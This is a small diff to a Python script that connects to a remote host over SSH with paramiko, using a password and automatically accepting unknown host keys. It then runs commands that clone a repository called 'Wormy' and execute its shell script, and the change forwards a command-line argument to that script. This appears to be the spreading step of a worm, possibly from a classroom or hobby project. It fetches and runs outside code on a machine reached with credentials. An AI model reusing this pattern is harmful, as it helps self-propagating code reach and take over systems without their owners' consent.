@@ -15,7 +15,7 @@ if __name__ == "__main__":
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         client.connect(host,username = username, password = password)
-        stdin, stdout, stderr = client.exec_command("cd Documents\ngit clone https://github.com/Timothyyung/Wormy\ncd Wormy\n./mormysh.sh")
+        stdin, stdout, stderr = client.exec_command("cd Documents\ngit clone https://github.com/Timothyyung/Wormy\ncd Wormy\n./mormysh.sh " + sys.argv[1])
         print (stdout.read())
         
     finally:
